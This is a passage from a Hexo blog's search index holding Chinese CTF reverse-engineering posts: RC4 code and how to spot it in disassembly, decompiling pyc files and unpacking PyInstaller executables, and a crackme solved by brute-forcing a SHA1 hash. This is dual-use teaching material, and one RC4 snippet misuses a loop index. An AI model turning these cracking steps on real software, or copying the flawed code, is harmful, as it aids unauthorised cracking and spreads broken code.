S[j];                   //只是根据T将位置打乱了\n      S[j] = S[i];\n      S[i] = tmp;\n    &#125;\n\n加密\nunsigned char tmp = 0x00;\nint i = 0;\nint j = 0;\nint r = 0;\nint t = 0;\n \nfor(r=0; r&lt;len; r++)\n\t\t&#123;\n      i = (i + 1) % 256;\n      j = (j + S[i]) % 256;\n      tmp = S[j];\n      S[j] = S[i];\n      S[i] = tmp;\n      t = (S[i] + S[j]) % 256;\n      K[r] = S[t];\n \n\t\t\tE[i] = (M[i] ^ K[i])//M[]:明文 E[]:密文\n\t\t&#125;\n\n3.代码实例：//程序开始\n#include&lt;stdio.h>\n#include&lt;string.h>\ntypedef unsigned longULONG;\n \n/*初始化函数*/\nvoid rc4_init(unsigned char*s, unsigned char*key, unsigned long Len)\n&#123;\n    int i = 0, j = 0;\n    char k[256] = &#123; 0 &#125;;\n    unsigned char tmp = 0;\n    for (i = 0; i&lt;256; i++)\n    &#123;\n        s[i] = i;\n        k[i] = key[i%Len];\n    &#125;\n    for (i = 0; i&lt;256; i++)\n    &#123;\n        j = (j + s[i] + k[i]) % 256;\n        tmp = s[i];\n        s[i] = s[j];//交换s[i]和s[j]\n        s[j] = tmp;\n    &#125;\n&#125;\n \n/*加解密*/\nvoid rc4_crypt(unsigned char*s, unsigned char*Data, unsigned long Len)\n&#123;\n    int i = 0, j = 0, t = 0;\n    unsigned long k = 0;\n    unsigned char tmp;\n    for (k = 0; k&lt;Len; k++)\n    &#123;\n        i = (i + 1) % 256;\n        j = (j + s[i]) % 256;\n        tmp = s[i];\n        s[i] = s[j];//交换s[x]和s[y]\n        s[j] = tmp;\n        t = (s[i] + s[j]) % 256;\n        Data[k] ^= s[t];\n    &#125;\n&#125;\n \nint main()\n&#123;\n    unsigned char s[256] = &#123; 0 &#125;, s2[256] = &#123; 0 &#125;;//S-box\n    char key[256] = &#123; \"justfortest\" &#125;;\n    char pData[512] = \"这是一个用来加密的数据Data\";\n    unsigned long len = strlen(pData);\n    int i;\n \n    printf(\"pData=%s\\\\n\", pData);\n    printf(\"key=%s,length=%d\\\\n\\\\n\", key, strlen(key));\n    rc4_init(s, (unsigned char*)key, strlen(key));//已经完成了初始化\n    printf(\"完成对S[i]的初始化，如下：\\\\n\\\\n\");\n    for (i = 0; i&lt;256; i++)\n    &#123;\n        printf(\"%02X\", s[i]);\n        if (i &amp;&amp; (i + 1) % 16 == 0)putchar('\\\\n');\n    &#125;\n    printf(\"\\\\n\\\\n\");\n    for (i = 0; i&lt;256; i++)//用s2[i]暂时保留经过初始化的s[i]，很重要的！！！\n    &#123;\n        s2[i] = s[i];\n    &#125;\n    printf(\"已经初始化，现在加密:\\\\n\\\\n\");\n    rc4_crypt(s, (unsigned char*)pData, len);//加密\n    printf(\"pData=%s\\\\n\\\\n\", pData);\n    printf(\"已经加密，现在解密:\\\\n\\\\n\");\n    //rc4_init(s,(unsignedchar*)key,strlen(key));//初始化密钥\n    rc4_crypt(s2, (unsigned char*)pData, len);//解密\n    printf(\"pData=%s\\\\n\\\\n\", pData);\n    return 0;\n&#125;\n \n//程序完\n\n由于加密是用的xor，而根据异或的对称性，加密和解密使用的是同一个函数。\nRC4逆向特征分析1.RC4在逆向中的特征：\n一般来说会需要调用两个函数，一个用来初始化S盒，一个用来生成密钥流然后加密\n初始化的数组为256字节也可以作为参考，(但不一定就是256字节)\n密钥字串会被用来循环填充到一个新表\n最后一定会用xor进行加解密\n\n2.For Example：以加密与解密中的RC4Sample.exe：\nwinmain→DialogFunc→sub_401270，截取部分代码\nchar v14[1032]; // [esp+214h] [ebp-408h] BYREF\nv5[0] = 1;\nv5[1] = 35;\nv5[2] = 69;\nv5[3] = 103;\nv5[4] = -119;\nv5[5] = -85;\nv5[6] = -51;\nv5[7] = -17;\nv1 = GetDlgItemTextA(hDlg, 110, &amp;String, 257);\nif ( v1 )\n&#123;\n  memset(v14, 0, sizeof(v14));\n  sub_401000(v14, v5, 8);\n  sub_401070(v14, &amp;String, v1);\n\n可以看到下面有两个函数，定义了一个v14变量，大小为1032字节。v5数组里有8个值，两变量一起被调用到了sub_401000函数内，跟过去：\n\n这里有两个段重要代码：\ndo\n    *s_box_1++ = v5++;\n  while ( v5 &lt; 256 );\n\n上面这段对应了原理部分的给S盒赋初值\ndo\n  &#123;\n    v9 = *v8;\n    v10 = (unsigned __int8)(result + *v8 + *(_BYTE *)(v3 + k));\n    ++v3;\n    result = v10;\n    *v8 = v4[v10];\n    v4[v10] = v9;\n    if ( v3 >= k_len )\n      v3 = 0;\n    ++v8;\n    --v11;\n  &#125;\n  while ( v11 );\n\n这部分代码则是对S盒进行乱序操作。\n接着我们看第二个函数。\n\n注意最长的那一行，这个程序不像之前的那样有一个专门的数组放密文，而是直接覆盖掉了明文。\n3.总结：RC4函数没有魔数一类的值为特征，但是从结构来看肯定会有三个part，第一为s盒的初始化，第二个为打乱s盒，第三个为加解密函数也就是异或。\n从0到1总结的RC4的伪代码为：\ni = (i + 1) % 256;\nj = (j + s[i]) % 256;\nswap(s[i],s[j]);\nt=(s[i] + s[j]) % 256;\n\n","slug":"Crypto/RC4算法分析及逆向特征","date":"2022-03-15T10:47:14.000Z","categories_index":"Crypto","tags_index":"reverse常见算法","author_index":"Big Devils"},{"id":"c34e721018d13d122ac641371d7bebf2","title":"python的逆向考点","content":"前置知识：\nhttps://magnificent-syrup-61f.notion.site/python-9aaee637228d499fabe9d08731f12c38\n考点一：pyc→pypyc转py的方法1.简单题一般可以用工具：uncompyle6，或者在线网站https://tool.lu/pyc直接转换成py源代码。\n例题为：1.pyc、findkey.pyc。\n2.题目难一点的话会让你不能直接用工具反汇编出源代码，如2021年的蓝帽杯半决赛就有一道题目无法用工具直接反汇编出源代码，此时我们就需要对pyc的文件结构及它的结构体进行分析。(这个Part还没整明白)\nFor Example:1.pyc解体思路：首先拿到的是一个pyc文件先尝试运行\n\n老套路让我们输入序列号，直接丢进在线反汇编网站：https://tool.lu/pyc\n反汇编后的python源码为：\n#!/usr/bin/env python\n# visit &lt;https://tool.lu/pyc/> for more information\nimport base64\n\ndef encode(message):\n    s = ''\n    for i in message:\n        x = ord(i) ^ 32\n        x = x + 16\n        s += chr(x)\n    \n    return base64.b64encode(s)\n\ncorrect = 'XlNkVmtUI1MgXWBZXCFeKY+AaXNt'\nflag = ''\nprint 'Input flag:'\nflag = raw_input()\nif encode(flag) == correct:\n    print 'correct'\nelse:\n    print 'wrong'\n\n代码的大概思路是将输入的字符串的每个元素与32异或再加上16，最后进行base64的加密。\nexp：\nimport base64\nrf = 'XlNkVmtUI1MgXWBZXCFeKY+AaXNt'\n\nrflag = base64.b64decode(rf)\nflag=''\nprint(rflag)\nfor i in rflag:\n    x=i-16\n    x=x^32\n    flag+=chr(x)\nprint(flag)\n\nflag为：nctf{d3c0mpil1n9_PyC}\ntips：\n在exp中一开始写了一个ord(i)-16,但是报错了，所以使用type查看了一下base64模块的返回值类型\nlook= type(base64.b64decode(rf))\nflag=''\nprint(look)\n\n\n可以看到返回的就是byte类型不需要转换了\n考点二：如何识别：py文件可以通过某种方式编译为exe可执行程序。\n1.如何识别这是一个被打包的py文件呢：\n\n打开ida如果发现有很多python的字符串，那么基本就可以给它判刑了。\n\n工具打包后的exe图标一般都是一个样\n\n\n2.目前常用的打包方式有两种：\n\nPy2exe\nPyinstaller\n\n3.针对不同的打包方式有不同的提取方法：\nPy2exe: https://github.com/matiasb/unpy2exe\npyinstaller: https://github.com/pyinstaller/pyinstaller\n\t\t\t https://github.com/extremecoders-re/pyinstxtractor\nFor Example：(HWS计划 wp)首先拿到程序“login.exe”直接运行看一下\n\n让我们输入password，输入错误会显示“nope！”\n扔到查壳工具里，是未加壳的64位程序\nida64打开，直接查看字符串，这时就可以看到有很多与py有关的字串\n\n判断它是经过exe打包的py文件，但是无法确定它是用的哪种方式进行的打包，所以两种都试一下。\n首先尝试一下py2exe：\npython unpy2exe login.exe\n\n\n这里可以看到它显示着不是py2exe打包的程序。那么接着尝试Pyinstaller：\npython pyinstxtractor.py login.exe\n\n运行后显示提取成功，cmd内容如下：\nE:\\\\桌面\\\\seedle\\\\工具>python pyinstxtractor.py login.exe\npyinstxtractor.py:86: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses\n  import imp\n[*] Processing login.exe\n[*] Pyinstaller version: 2.1+\n[*] Python version: 27\n[*] Length of package: 3701450 bytes\n[*] Found 18 files in CArchive\n[*] Beginning extraction...please standby\n[+] Possible entry point: pyiboot01_bootstrap\n[+] Possible entry point: login\n[!] Warning: The script is running in a different python version than the one used to build the executable\n    Run this script in Python27 to prevent extraction errors(if any) during unmarshalling\n[*] Found 194 files in PYZ archive\n[*] Successfully extracted pyinstaller archive: login.exe\n\nYou can now use a python decompiler on the pyc files within the extracted directory\n\n上面的回显显示提取出来的东西放在了exetracted目录下\n\n进入login.exe_extracted文件夹\n\n在这个文件夹中，我们要找的文件没有后缀名，也不在其他的文件夹中，这个文件夹我们要找的就是login。\n这里一开始的思路是手动添加“.pyc”尾缀，然后放到在线反编译网站上转py源文件，但是可以看到反编译失败，但是看它返回的错误的意思是部分反汇编失败。\n这里百度得出的结果是提取出的文件缺失pyc文件的前面两个部分，一个是版本魔数，一个是创建时间\n把这个程序丢到二进制分析工具里面对比分析\n\n\n我们对比一下提取出来login文件和正常的文件的区别。\n正常的pyc文件是前面八个分别是四个字节版本魔数和四个字节的创建时间，之后才是PyCodeObject结构体\n\n而login文件是直接就是PyCodeObject结构体开头\n\n我们这里直接复制1.pyc的前面八个字节到login内，然后保存：\n\n此时再放到反编译网站就可以反编译成功了：\n\n#!/usr/bin/env python\n# visit &lt;https://tool.lu/pyc/> for more information\n\ndef check(a):\n    target = 'YWtmYHxgaGhjWHRzcmN+eg=='.decode('base64')\n    for i in range(len(a)):\n        if chr(ord(a[i]) ^ 7) != target[i]:\n            return 0\n    \n    return 1\n\na = raw_input('password:')\nif check(a) == 1:\n    print 'ok!'\nelse:\n    print 'nope!'\nraw_input()\n\nexp:\nimport base64\nrflag=base64.b64decode('YWtmYHxgaGhjWHRzcmN+eg==')\nflag=''\nfor i in range(len(rflag)):\n    flag+=chr(rflag[i]^7)\nprint(flag)\n\n\n","slug":"Reverse/python的逆向考点","date":"2022-03-15T07:25:10.000Z","categories_index":"Reverse","tags_index":"语言逆向","author_index":"Big Devils"},{"id":"3fffde4c087696455aa9600680b2d3ff","title":"Crypto脑图","content":"加密一般分为对称加密(Symmetric Key Encryption)和非对称加密(Asymmetric Key Encryption)。\n对称加密又分为分组加密和序列密码。\n分组密码，也叫块加密(block cyphers)，一次加密明文中的一个块。是将明文按一定的位长分组，明文组经过加密运算得到密文组，密文组经过解密运算（加密运算的逆运算），还原成明文组。\n序列密码，也叫流加密(stream cyphers)，一次加密明文中的一个位。是指利用少量的密钥（制乱元素）通过某种复杂的运算（密码算法）产生大量的伪随机位流，用于对明文位流的加密。\n\n","slug":"Crypto/Crypto脑图","date":"2022-03-15T07:17:46.000Z","categories_index":"Crypto","tags_index":"","author_index":"Big Devils"},{"id":"4b1fbc501a26eea6619e2e89180a8452","title":"md5逆向题实例","content":"知识点：\n\n\nrtf文件\nhttps://magnificent-syrup-61f.notion.site/rtf-e2d961992a914f4eab37f3356db9e994\n\n\n\natoi&#x2F;itoa函数\nhttps://magnificent-syrup-61f.notion.site/atoi-itoa-a9be71db8a864e128429d4e826a1ec2d\n\n\npython的hashlib库\nhttps://magnificent-syrup-61f.notion.site/python-hashlib-0c3d02fa25e9444d88b9d5ed30d25eb0\n\n\n题解前期分析：\n无壳，32位\nida分析：主函数的代码：\nint __cdecl main_0(int argc, const char **argv, const char **envp)\n&#123;\n  DWORD v3; // eax\n  DWORD v4; // eax\n  char Str[260]; // [esp+4Ch] [ebp-310h] BYREF\n  int v7; // [esp+150h] [ebp-20Ch]\n  char String1[260]; // [esp+154h] [ebp-208h] BYREF\n  char Destination[260]; // [esp+258h] [ebp-104h] BYREF\n\n  memset(Destination, 0, sizeof(Destination));\n  memset(String1, 0, sizeof(String1));\n  v7 = 0;\n  printf(\"pls input the first passwd(1): \");\n  scanf(\"%s\", Destination);                 //输入第一个密码\n  if ( strlen(Destination) != 6 )             //密码长度为6\n  &#123;\n    printf(\"Must be 6 characters!\\\\n\");\n    ExitProcess(0);\n  &#125;\n  v7 = atoi(Destination);                    //将数字字符准换为整型数据\n  if ( v7 &lt; 100000 )\n    ExitProcess(0);\n  strcat(Destination, \"@DBApp\");             //在密码字符串后面加上@DBApp\n  v3 = strlen(Destination);\n  sub_40100A((BYTE *)Destination, v3, String1);      //跳入这个加密函数(这是解开密码1的关键函数)\n  if ( !_strcmpi(String1, \"6E32D0943418C2C33385BC35A1470250DD8923A9\") )  //经过函数加密后与\n  &#123;\n    printf(\"continue...\\\\n\\\\n\");\n    printf(\"pls input the first passwd(2): \");\n    memset(Str, 0, sizeof(Str));\n    scanf(\"%s\", Str);\n    if ( strlen(Str) != 6 )\n    &#123;\n      printf(\"Must be 6 characters!\\\\n\");\n      ExitProcess(0);\n    &#125;\n    strcat(Str, Destination);\n    memset(String1, 0, sizeof(String1));\n    v4 = strlen(Str);\n    sub_401019((BYTE *)Str, v4, String1);\n    if ( !_strcmpi(\"27019e688a4e62a649fd99cadaafdb4e\", String1) )\n    &#123;\n      if ( !(unsigned __int8)sub_40100F(Str) )\n      &#123;\n        printf(\"Error!!\\\\n\");\n        ExitProcess(0);\n      &#125;\n      printf(\"bye ~~\\\\n\");\n    &#125;\n  &#125;\n  return 0;\n&#125;\n\n程序大概就是两次的密码验证\n\n首先分析第一个加密函数：\nint __cdecl sub_401230(BYTE *pbData, DWORD dwDataLen, LPSTR lpString1)\n&#123;\n  int result; // eax\n  DWORD i; // [esp+4Ch] [ebp-28h]\n  CHAR String2[4]; // [esp+50h] [ebp-24h] BYREF\n  BYTE v6[20]; // [esp+54h] [ebp-20h] BYREF\n  DWORD pdwDataLen; // [esp+68h] [ebp-Ch] BYREF\n  HCRYPTHASH phHash; // [esp+6Ch] [ebp-8h] BYREF\n  HCRYPTPROV phProv; // [esp+70h] [ebp-4h] BYREF\n\n  if ( !CryptAcquireContextA(&amp;phProv, 0, 0, 1u, 0xF0000000) )\n    return 0;\n  if ( CryptCreateHash(phProv, 0x8004u, 0, 0, &amp;phHash) )\n  &#123;\n    if ( CryptHashData(phHash, pbData, dwDataLen, 0) )\n    &#123;\n      CryptGetHashParam(phHash, 2u, v6, &amp;pdwDataLen, 0);\n      *lpString1 = 0;\n      for ( i = 0; i &lt; pdwDataLen; ++i )\n      &#123;\n        wsprintfA(String2, \"%02X\", v6[i]);\n        lstrcatA(lpString1, String2);\n      &#125;\n      CryptDestroyHash(phHash);\n      CryptReleaseContext(phProv, 0);\n      result = 1;\n    &#125;\n    else\n    &#123;\n      CryptDestroyHash(phHash);\n      CryptReleaseContext(phProv, 0);\n      result = 0;\n    &#125;\n  &#125;\n  else\n  &#123;\n    CryptReleaseContext(phProv, 0);\n    result = 0;\n  &#125;\n  return result;\n&#125;\n\n粗略看一下被调用的函数指向的算法为单向散列算法hash。\n百度一下这些函数已经被弃用了，主要的函数是：\n\nCryptCreateHash( )\nBOOL CryptAcquireContextA(\n  [out] HCRYPTPROV *phProv,     \\\\\\\\通过调用 CryptAcquireContext创建的 CSP 的句柄。\n  [in]  LPCSTR     szProvider,  \\\\\\\\标识要使用的哈希算法的ALG_ID值(要使用哪种加密算法)\n  [in]  DWORD      dwProvType,  \\\\\\\\如果散列算法的类型是键控散列，例如基于散列的消息验证码(HMAC) 或消息验证码(MAC) 算法，则在此参数中传递散列的密钥。对于非键控算法，此参数必须设置为零。\n  [in]  DWORD      dwFlags      \\\\\\\\函数将句柄复制到新哈希对象的地址。使用完散列对象后，通过调用CryptDestroyHash函数释放句柄。\n);\n\n核心成员是第二个它标识着用到的算法是哪一个\n\nLPCSTR的ALG_ID：具体算法与数值对应关系\n\n\n\n通过特征码8004，确定散列算法为SHA1,思路基本确定为爆破枚举，而且已知密码的前6位有数字组成后面加上六个字符@DBApp 。\nexp为：\nimport hashlib\nrflag='6E32D0943418C2C33385BC35A1470250DD8923A9'.lower()\nstr1='@DBApp'\n\nfor i in range(100000,1000000):\n    flag=str(i)+str1            #需要用str将整型转成字符串,达到三者数据类型相匹配\n    obj=hashlib.sha1(flag.encode(\"utf-8\"))\n    flag=obj.hexdigest()\n    if flag==rflag:\n        print(i)\n\n'''\n这里有一点需要注意hashlib加密后的十六进制的字母是以小写的形式，\n所以上面的判断直接比较的话一定会找不到，需要用字符串操作“lower”方法\n将rflag字串的大写字符转小写\n'''\n\n解体方式：  得出第一轮的密码为：123321\n    跟进第二个函数还是hash，看特征码8003，是MD5。但这里遇到一个问题就是它没有规定这六个是什么字符，这要是爆破的话，难度大了许多，但是路见不平绕道而行，我们用别的办法：\n\n思路为在线网站解密hash\n  我们已经知道了hash值，可以考虑直接去在线网站解密，然后直接得出两个密码\n  \n  这样密码就都到手了：\n  密码1：123321\n  密码2：~!3a@0\n  分别输入这两个密码：\n  \n  同一目录下就会出现一个文件：\n  \n  打开就是flag\n\n\n\n","slug":"Reverse/md5逆向题实例","date":"2022-03-15T02:48:39.000Z","categories_index":"Reverse","tags_index":"算法实例分析,WP","author_index":"Big Devils"},{"id":"0c474fb1f1d514e490492b4c7d30611c","title":"md5算法分析","content":"前言：MD5消息摘要算法(Message Digest Algorithm)，它对输入的任意长度的消息进行运算，产生一个128位的消息摘要。\n算法原理：1.数据填充：对原数据进行消息填充，使其长度取余512余448(448 mod 512)。换句话说就是填充后的数据长度比512的倍数小64位。并且这个数据填充是必做的操作，其实数据正好与448模512同余,也要填充。填充的动作是：附一个1在消息后面，然后用0来填充，直到消息的长度与448模512同余。至少填充1位，至多填充512位。\n2.添加长度：(这里和前面一步又呼应，多的448+64正好512)将上一步的结果附上64位的原数据长度，但如果要填充的原数据长度超过了2^64(本来就只有64字节给它放长度)则用原数据的低64位作为数据填充。(反正到这里得把数据弄到512的整数倍)\n3.初始化变量：用4个变量(A、B、C、D)计算消息摘要，这四个都是大小为32位的寄存器，这些寄存器根据下面的值进行初始化：\nA = 01234567h\nB = 89ABCDEFh\nC = FEDCBA98h\nD = 76543210h\n\nA = 0x67452301h\nB = 0xEFCDAB89h\nC = 0x98BADCFEh\nD = 0x10325476h\n\n4.数据处理：接着将处理后的数据以512位为一组进行运算，首先定义四个辅助函数，每个都是以3个32位双字作为输入，输出1个32位双字。\nF(X,Y,Z)=(X &amp; Y) | ((~X) &amp; Z);\nG(X,Y,Z)=(X &amp; Z) | (Y &amp; (~Z));\nH(X,Y,Z)=X ^ Y ^ Z;\nI(X,Y,Z)=Y ^ (X | (~Z));\n\n","slug":"Crypto/md5算法分析","date":"2022-03-15T01:45:46.000Z","categories_index":"Crypto","tags_index":"reverse常见算法","author_index":"Big Devils"},{"id":"b9663f58f18133b35bfe243f3e916a80","title":"Hello World","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new \"My New Post\"\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n","slug":"hello-world","date":"2022-03-14T09:34:34.870Z","categories_index":"","tags_index":"","author_index":"Big Devils"}]